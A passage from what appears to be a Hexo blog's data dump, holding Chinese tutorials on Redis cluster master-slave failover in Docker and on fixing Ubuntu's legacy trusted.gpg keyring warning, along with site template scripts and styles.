nodes</span><br><span class=\"line\">8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1692013667508 2 connected</span><br><span class=\"line\">6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 myself,master - 0 1692013666000 2 connected 5461-10922</span><br><span class=\"line\">41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1692013667000 3 connected 10923-16383</span><br><span class=\"line\">f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 master,fail - 1692013443386 1692013440000 1 disconnected</span><br><span class=\"line\">9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1692013665000 3 connected</span><br><span class=\"line\">849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 master - 0 1692013665498 7 connected 0-5460</span><br><span class=\"line\">127.0.0.1:6382&gt; </span><br></pre></td></tr></table></figure>\n\n<p>可以看到当前6号机处于master状态，顶替了原来1号机的位置，而1号机现在处于fail状态。</p>\n<p>这就完成了redis主从切换的演示，补充一句，如果把1号机重新启动回来的话，也不会影响现在6号机的master状态，1号机会作为6号机的slave机器。</p>\n<p>效果如下：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker start redis-node-1 </span></span><br><span class=\"line\">redis-node-1</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker exec -it redis-node-1 bash</span></span><br><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli -p 6381 -c</span></span><br><span class=\"line\">127.0.0.1:6381&gt; cluster nodes</span><br><span class=\"line\">849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 master - 0 1692013947000 7 connected 0-5460</span><br><span class=\"line\">f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,slave 849a82f0bd85238762ca7ccf234aa30ba97d93a0 0 1692013947000 7 connected</span><br><span class=\"line\">9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1692013946019 3 connected</span><br><span class=\"line\">8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1692013949036 2 connected</span><br><span class=\"line\">6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1692013947022 2 connected 5461-10922</span><br><span class=\"line\">41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1692013948030 3 connected 10923-16383</span><br><span class=\"line\">127.0.0.1:6381&gt; </span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"操作步骤\"><a href=\"#操作步骤\" class=\"headerlink\" title=\"操作步骤\"></a>操作步骤</h3><ol>\n<li>查看当前的集群情况</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli -p 6381 -c</span></span><br><span class=\"line\">127.0.0.1:6381&gt; cluster nodes</span><br><span class=\"line\">41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1691996146001 3 connected 10923-16383</span><br><span class=\"line\">849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 slave f999e35136ec2e61fcceebf182f5c38ef4a4354d 0 1691996144999 1 connected</span><br><span class=\"line\">9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1691996144000 3 connected</span><br><span class=\"line\">f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,master - 0 1691996145000 1 connected 0-5460</span><br><span class=\"line\">8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1691996144000 2 connected</span><br><span class=\"line\">6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1691996144000 2 connected 5461-10922</span><br><span class=\"line\">127.0.0.1:6381&gt; </span><br></pre></td></tr></table></figure>","more":"<p>当前登录主机为1号机，6号机是1号机的从服务器，5号机是3号机的从服务器，4号机是2号机的从服务器。</p>\n<ol start=\"2\">\n<li>关闭1号机容器，然后再次查看容器的状态</li>\n</ol>\n<p>关闭1号容器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker stop redis-node-1</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker stop redis-node-1</span></span><br><span class=\"line\">redis-node-1</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker ps -a</span></span><br><span class=\"line\">CONTAINER ID   IMAGE         COMMAND                  CREATED        STATUS                     PORTS     NAMES</span><br><span class=\"line\">61d59245db3d   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   28 hours ago   Up 5 hours                           redis-node-6</span><br><span class=\"line\">223fad42e069   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   28 hours ago   Up 5 hours                           redis-node-5</span><br><span class=\"line\">f0055941fe3f   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   28 hours ago   Up 5 hours                           redis-node-4</span><br><span class=\"line\">e361d9695a0c   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   28 hours ago   Up 5 hours                           redis-node-3</span><br><span class=\"line\">400119c3015c   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   28 hours ago   Up 5 hours                           redis-node-2</span><br><span class=\"line\">61e2e38927c4   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   28 hours ago   Exited (0) 9 seconds ago             redis-node-1</span><br></pre></td></tr></table></figure>\n\n<p>可以看到1号容器已经被关掉了。</p>\n<ol start=\"3\">\n<li>然后以2号机作为切入点，查看集群的状态。</li>\n</ol>\n<p>进入2号容器：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it redis-node-2 bash</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker exec -it redis-node-2 bash</span></span><br><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli -p 6382 -c</span></span><br><span class=\"line\">127.0.0.1:6382&gt; cluster nodes</span><br><span class=\"line\">8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1692013667508 2 connected</span><br><span class=\"line\">6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 myself,master - 0 1692013666000 2 connected 5461-10922</span><br><span class=\"line\">41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1692013667000 3 connected 10923-16383</span><br><span class=\"line\">f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 master,fail - 1692013443386 1692013440000 1 disconnected</span><br><span class=\"line\">9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1692013665000 3 connected</span><br><span class=\"line\">849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 master - 0 1692013665498 7 connected 0-5460</span><br><span class=\"line\">127.0.0.1:6382&gt; </span><br></pre></td></tr></table></figure>\n\n<p>可以看到当前6号机处于master状态，顶替了原来1号机的位置，而1号机现在处于fail状态。</p>\n<p>这就完成了redis主从切换的演示，补充一句，如果把1号机重新启动回来的话，也不会影响现在6号机的master状态，1号机会作为6号机的slave机器。</p>\n<p>效果如下：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker start redis-node-1 </span></span><br><span class=\"line\">redis-node-1</span><br><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker exec -it redis-node-1 bash</span></span><br><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli -p 6381 -c</span></span><br><span class=\"line\">127.0.0.1:6381&gt; cluster nodes</span><br><span class=\"line\">849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 master - 0 1692013947000 7 connected 0-5460</span><br><span class=\"line\">f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,slave 849a82f0bd85238762ca7ccf234aa30ba97d93a0 0 1692013947000 7 connected</span><br><span class=\"line\">9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1692013946019 3 connected</span><br><span class=\"line\">8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1692013949036 2 connected</span><br><span class=\"line\">6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1692013947022 2 connected 5461-10922</span><br><span class=\"line\">41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1692013948030 3 connected 10923-16383</span><br><span class=\"line\">127.0.0.1:6381&gt; </span><br></pre></td></tr></table></figure>"},{"title":"修复Ubuntu中的“Key is stored in legacy trusted.gpg keyring”问题","date":"2023-08-06T13:46:38.000Z","_content":"\n在Ubuntu下载软件时，经常会安装一些存储秘钥，时间一长就会有一些过期的，不能用的，经常会在`apt udate`时进行检测，卡着很长时间，最后进行警告，非常浪费时间，而且对于强迫症患者来讲，提示警告和提示报错没什么区别，必须解决。\n\n### 解决办法\n\n* 报错信息\n\n```bash\n有 44 个软件包可以升级。请执行 ‘apt list --upgradable’ 来查看它们。\nW: https://community-store-packages.deepin.com/appstore/dists/eagle/InRelease: 密钥存储在过时的 trusted.gpg 密钥环中（/etc/apt/trusted.gpg），请参见 apt-key(8) 的 DEPRECATION 一节以了解详情。\nW: 无法下载 https://typora.io/linux/./InRelease  Could not wait for server fd - select (11: 资源暂时不可用) [IP: 2a03:2880:f10d:183:face:b00c:0:25de 443]\nW: 部分索引文件下载失败。如果忽略它们，那将转而使用旧的索引文件。\n```\n<!-- more -->\n\n这一共有两个警告，第一个是提示有过期的存储秘钥，第二个是索引文件下载失败。\n\n* 解决索引文件下载失败\n\n注意索引文件的关键字有`typora`，进入存储索引文件的目录`/etc/apt/sources.list.d/`，把相关的文件直接删除即可。\n\n```bash\nknight@knight:~/wechat$ cd /etc/apt/sources.list.d/\nknight@knight:/etc/apt/sources.list.d$ ls\ndeepin_appstore.list       google-chrome.list.save       typora.list       vscode.list.save\ndeepin_appstore.list.save  tickstep-aliyunpan.list       typora.list.save  winehq-focal.sources\ngoogle-chrome.list         tickstep-aliyunpan.list.save  vscode.list\nknight@knight:/etc/apt/sources.list.d$ sudo rm -rf typora.list*\nknight@knight:/etc/apt/sources.list.d$ ls\ndeepin_appstore.list       google-chrome.list.save       vscode.list\ndeepin_appstore.list.save  tickstep-aliyunpan.list       vscode.list.save\ngoogle-chrome.list         tickstep-aliyunpan.list.save  winehq-focal.sources\n```\n\n* 解决有过期的存储秘钥\n\n解决完索引文件的问题之后，警告就变成了：\n\n```bash\n有 44 个软件包可以升级。请执行 ‘apt list --upgradable’ 来查看它们。\nW: https://community-store-packages.deepin.com/appstore/dists/eagle/InRelease: 密钥存储在过时的 trusted.gpg 密钥环中（/etc/apt/trusted.gpg），请参见 apt-key(8) 的 DEPRECATION 一节以了解详情。\n```\n\n1. 首先先查看一下系统有多少存储秘钥\n\n```bash 折叠代码\nknight@knight:~/nustarain$ sudo apt-key list\n[sudo] knight 的密码： \nWarning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8)).\n/etc/apt/trusted.gpg\n--------------------\npub   rsa2048 2014-12-16 [SC]\n      6BDB FE94 72C9 961F 4C19  73A1 4259 56BB 3E31 DF51\nuid             [ 未知 ] pkg-builder <pkg-builder@packages.linuxdeepin.com>\nsub   rsa2048 2014-12-16 [E]\n\npub   rsa2048 2019-11-21 [SC]\n      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB\nuid             [ 未知 ] appstore (appstore key) <appstore@deepin.com>\nsub   rsa2048 2019-11-21 [E]\nsub   rsa2048 2019-11-21 [E]\n\n/etc/apt/trusted.gpg.d/appstore.gpg\n-----------------------------------\npub   rsa2048 2019-11-21 [SC]\n      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB\nuid             [ 未知 ] appstore (appstore key) <appstore@deepin.com>\nsub   rsa2048 2019-11-21 [E]\nsub   rsa2048 2019-11-21 [E]\n\n/etc/apt/trusted.gpg.d/google-chrome.gpg\n----------------------------------------\npub   rsa4096 2016-04-12 [SC]\n      EB4C 1BFD 4F04 2F6D DDCC  EC91 7721 F63B D38B 4796\nuid             [ 未知 ] Google Inc. (Linux Packages Signing Authority) <linux-packages-keymaster@google.com>\nsub   rsa4096 2021-10-26 [S] [有效至：2024-10-25]\nsub   rsa4096 2023-02-15 [S] [有效至：2026-02-14]\n\n/etc/apt/trusted.gpg.d/microsoft.gpg\n------------------------------------\npub   rsa2048 2015-10-28 [SC]\n      BC52 8686 B50D 79E3 39D3  721C EB3E 94AD BE12 29CF\nuid             [ 未知 ] Microsoft (Release signing) <gpgsecurity@microsoft.com>\n\n/etc/apt/trusted.gpg.d/tickstep-packages-archive-keyring.gpg\n------------------------------------------------------------\npub   rsa4096 2022-07-30 [SCEA]\n      071D E06F 6BCE 212C 5483  CECF 3D4C 35B0 8026 4AA9\nuid             [ 未知 ] tickstep <tickstep@outlook.com>\n\n/etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg\n------------------------------------------------------\npub   rsa4096 2012-05-11 [SC]\n      8439 38DF 228D 22F7 B374  2BC0 D94A A3F0 EFE2 1092\nuid             [ 未知 ] Ubuntu CD Image Automatic Signing Key (2012) <cdimage@ubuntu.com>\n\n/etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg\n------------------------------------------------------\npub   rsa4096 2018-09-17 [SC]\n      F6EC B376 2474 EDA9 D21B  7022 8719 20D1 991B C93C\nuid             [ 未知 ] Ubuntu Archive Automatic Signing Key (2018) <ftpmaster@ubuntu.com>\n```\n\n2. 可以看到有很多秘钥，然后在报错信息里面找关键字，发现有`deepin`关键字，然后使用 grep 查找，可以筛选出来，符合条件的就只有两个。\n\n```bash 折叠代码\n/etc/apt/trusted.gpg\n--------------------\npub   rsa2048 2014-12-16 [SC]\n      6BDB FE94 72C9 961F 4C19  73A1 4259 56BB 3E31 DF51\nuid             [ 未知 ] pkg-builder <pkg-builder@packages.linuxdeepin.com>\nsub   rsa2048 2014-12-16 [E]\n\npub   rsa2048 2019-11-21 [SC]\n      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB\nuid             [ 未知 ] appstore (appstore key) <appstore@deepin.com>\nsub   rsa2048 2019-11-21 [E]\nsub   rsa2048 2019-11-21 [E]\n```\n\n3. 将这两个秘钥逐一导出即可，导出时用到秘钥的后8位作为标记（去掉空格）。\n\n```bash\nknight@knight:/etc/apt/trusted.gpg.d$ sudo apt-key export 0A53D5BB | sudo gpg --dearmour -o /etc/apt/trusted.gpg.d/appstore.gpg\nWarning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8)).\n```\n\n上面这条命令的意思是：导出秘钥后8位为`0A53D5BB`的秘钥，导出到`/etc/apt/trusted.gpg.d/`目录下，并且命名为`appstore.gpg`。\n\n然后去存储秘钥的目录下验证，发现存在这样的一个文件。\n\n```bash\nknight@knight:/etc/apt/trusted.gpg.d$ ls /etc/apt/trusted.gpg.d/\nappstore.gpg       microsoft.gpg                          ubuntu-keyring-2012-cdimage.gpg\ngoogle-chrome.gpg  tickstep-packages-archive-keyring.gpg  ubuntu-keyring-2018-archive.gpg\n```\n\n4. 最后，`sudo apt-key list`查看导出的秘钥并不会消失，但是执行`sudo apt update`不会再报警告了。\n\n``` bash \n获取:18 http://mirrors.aliyun.com/ubuntu jammy-security/universe amd64 DEP-11 Metadata [39.9 kB] \n命中:19 https://dl.winehq.org/wine-builds/ubuntu focal InRelease                     \n命中:20 http://file.tickstep.com/apt aliyunpan InRelease \n已下载 3,765 kB，耗时 6秒 (654 kB/s)\n正在读取软件包列表... 完成\n正在分析软件包的依赖关系树... 完成\n正在读取状态信息... 完成                 \n有 11 个软件包可以升级。请执行 ‘apt list --upgradable’ 来查看它们。\nknight@knight:~/nustarain$ \n```","source":"_posts/Remove-aptkey.md","raw":"---\ntitle: 修复Ubuntu中的“Key is stored in legacy trusted.gpg keyring”问题\ndate: 2023-08-06 21:46:38\ncategories: 探索\ntags:\n  - Ubuntu\n---\n\n在Ubuntu下载软件时，经常会安装一些存储秘钥，时间一长就会有一些过期的，不能用的，经常会在`apt udate`时进行检测，卡着很长时间，最后进行警告，非常浪费时间，而且对于强迫症患者来讲，提示警告和提示报错没什么区别，必须解决。\n\n### 解决办法\n\n* 报错信息\n\n```bash\n有 44 个软件包可以升级。请执行 ‘apt list --upgradable’ 来查看它们。\nW: https://community-store-packages.deepin.com/appstore/dists/eagle/InRelease: 密钥存储在过时的 trusted.gpg 密钥环中（/etc/apt/trusted.gpg），请参见 apt-key(8) 的 DEPRECATION 一节以了解详情。\nW: 无法下载 https://typora.io/linux/./InRelease  Could not wait for server fd - select (11: 资源暂时不可用) [IP: 2a03:2880:f10d:183:face:b00c:0:25de 443]\nW: 部分索引文件下载失败。如果忽略它们，那将转而使用旧的索引文件。\n```\n<!-- more -->\n\n这一共有两个警告，第一个是提示有过期的存储秘钥，第二个是索引文件下载失败。\n\n* 解决索引文件下载失败\n\n注意索引文件的关键字有`typora`，进入存储索引文件的目录`/etc/apt/sources.list.d/`，把相关的文件直接删除即可。\n\n```bash\nknight@knight:~/wechat$ cd /etc/apt/sources.list.d/\nknight@knight:/etc/apt/sources.list.d$ ls\ndeepin_appstore.list       google-chrome.list.save       typora.list       vscode.list.save\ndeepin_appstore.list.save  tickstep-aliyunpan.list       typora.list.save  winehq-focal.sources\ngoogle-chrome.list         tickstep-aliyunpan.list.save  vscode.list\nknight@knight:/etc/apt/sources.list.d$ sudo rm -rf typora.list*\nknight@knight:/etc/apt/sources.list.d$ ls\ndeepin_appstore.list       google-chrome.list.save       vscode.list\ndeepin_appstore.list.save  tickstep-aliyunpan.list       vscode.list.save\ngoogle-chrome.list         tickstep-aliyunpan.list.save  winehq-focal.sources\n```\n\n* 解决有过期的存储秘钥\n\n解决完索引文件的问题之后，警告就变成了：\n\n```bash\n有 44 个软件包可以升级。请执行 ‘apt list --upgradable’ 来查看它们。\nW: https://community-store-packages.deepin.com/appstore/dists/eagle/InRelease: 密钥存储在过时的 trusted.gpg 密钥环中（/etc/apt/trusted.gpg），请参见 apt-key(8) 的 DEPRECATION 一节以了解详情。\n```\n\n1. 首先先查看一下系统有多少存储秘钥\n\n```bash 折叠代码\nknight@knight:~/nustarain$ sudo apt-key list\n[sudo] knight 的密码： \nWarning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8)).\n/etc/apt/trusted.gpg\n--------------------\npub   rsa2048 2014-12-16 [SC]\n      6BDB FE94 72C9 961F 4C19  73A1 4259 56BB 3E31 DF51\nuid             [ 未知 ] pkg-builder <pkg-builder@packages.linuxdeepin.com>\nsub   rsa2048 2014-12-16 [E]\n\npub   rsa2048 2019-11-21 [SC]\n      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB\nuid             [ 未知 ] appstore (appstore key) <appstore@deepin.com>\nsub   rsa2048 2019-11-21 [E]\nsub   rsa2048 2019-11-21 [E]\n\n/etc/apt/trusted.gpg.d/appstore.gpg\n-----------------------------------\npub   rsa2048 2019-11-21 [SC]\n      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB\nuid             [ 未知 ] appstore (appstore key) <appstore@deepin.com>\nsub   rsa2048 2019-11-21 [E]\nsub   rsa2048 2019-11-21 [E]\n\n/etc/apt/trusted.gpg.d/google-chrome.gpg\n----------------------------------------\npub   rsa4096 2016-04-12 [SC]\n      EB4C 1BFD 4F04 2F6D DDCC  EC91 7721 F63B D38B 4796\nuid             [ 未知 ] Google Inc. (Linux Packages Signing Authority) <linux-packages-keymaster@google.com>\nsub   rsa4096 2021-10-26 [S] [有效至：2024-10-25]\nsub   rsa4096 2023-02-15 [S] [有效至：2026-02-14]\n\n/etc/apt/trusted.gpg.d/microsoft.gpg\n------------------------------------\npub   rsa2048 2015-10-28 [SC]\n      BC52 8686 B50D 79E3 39D3  721C EB3E 94AD BE12 29CF\nuid             [ 未知 ] Microsoft (Release signing) <gpgsecurity@microsoft.com>\n\n/etc/apt/trusted.gpg.d/tickstep-packages-archive-keyring.gpg\n------------------------------------------------------------\npub   rsa4096 2022-07-30 [SCEA]\n      071D E06F 6BCE 212C 5483  CECF 3D4C 35B0 8026 4AA9\nuid             [ 未知 ] tickstep <tickstep@outlook.com>\n\n/etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg\n------------------------------------------------------\npub   rsa4096 2012-05-11 [SC]\n      8439 38DF 228D 22F7 B374  2BC0 D94A A3F0 EFE2 1092\nuid             [ 未知 ] Ubuntu CD Image Automatic Signing Key (2012) <cdimage@ubuntu.com>\n\n/etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg\n------------------------------------------------------\npub   rsa4096 2018-09-17 [SC]\n      F6EC B376 2474 EDA9 D21B  7022 8719 20D1 991B C93C\nuid             [ 未知 ] Ubuntu Archive Automatic Signing Key (2018) <ftpmaster@ubuntu.com>\n```\n\n2. 可以看到有很多秘钥，然后在报错信息里面找关键字，发现有`deepin`关键字，然后使用 grep 查找，可以筛选出来，符合条件的就只有两个。\n\n```bash 折叠代码\n/etc/apt/trusted.gpg\n--------------------\npub   rsa2048 2014-12-16 [SC]\n      6BDB FE94 72C9 961F 4C19  73A1 4259 56BB 3E31 DF51\nuid             [ 未知 ] pkg-builder <pkg-builder@packages.linuxdeepin.com>\nsub   rsa2048 2014-12-16 [E]\n\npub   rsa2048 2019-11-21 [SC]\n      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB\nuid             [ 未知 ] appstore (appstore key) <appstore@deepin.com>\nsub   rsa2048 2019-11-21 [E]\nsub   rsa2048 2019-11-21 [E]\n```\n\n3. 将这两个秘钥逐一导出即可，导出时用到秘钥的后8位作为标记（去掉空格）。\n\n```bash\nknight@knight:/etc/apt/trusted.gpg.d$ sudo apt-key export 0A53D5BB | sudo gpg --dearmour -o /etc/apt/trusted.gpg.d/appstore.gpg\nWarning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8)).\n```\n\n上面这条命令的意思是：导出秘钥后8位为`0A53D5BB`的秘钥，导出到`/etc/apt/trusted.gpg.d/`目录下，并且命名为`appstore.gpg`。\n\n然后去存储秘钥的目录下验证，发现存在这样的一个文件。\n\n```bash\nknight@knight:/etc/apt/trusted.gpg.d$ ls /etc/apt/trusted.gpg.d/\nappstore.gpg       microsoft.gpg                          ubuntu-keyring-2012-cdimage.gpg\ngoogle-chrome.gpg  tickstep-packages-archive-keyring.gpg  ubuntu-keyring-2018-archive.gpg\n```\n\n4. 最后，`sudo apt-key list`查看导出的秘钥并不会消失，但是执行`sudo apt update`不会再报警告了。\n\n``` bash \n获取:18 http://mirrors.aliyun.com/ubuntu jammy-security/universe amd64 DEP-11 Metadata [39.9 kB] \n命中:19 